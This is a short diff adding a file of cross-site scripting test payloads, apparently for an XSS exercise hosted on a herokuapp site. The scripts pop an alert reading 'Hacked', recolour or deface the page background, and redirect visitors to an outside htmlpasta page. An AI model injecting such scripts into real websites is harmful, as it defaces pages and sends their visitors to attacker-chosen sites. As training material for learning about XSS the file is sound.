@@ -1,0 +1,9 @@
+<script>alert("Hacked");</script>
+
+<script>document.body.bgColor="red";</script>
+
+<script>document.body.background="<><><><><";</script>
+
+<script>window.location="https://unfallensrilankanelephant.htmlpasta.com";</script>
+
+https://gcixsstask.herokuapp.com/
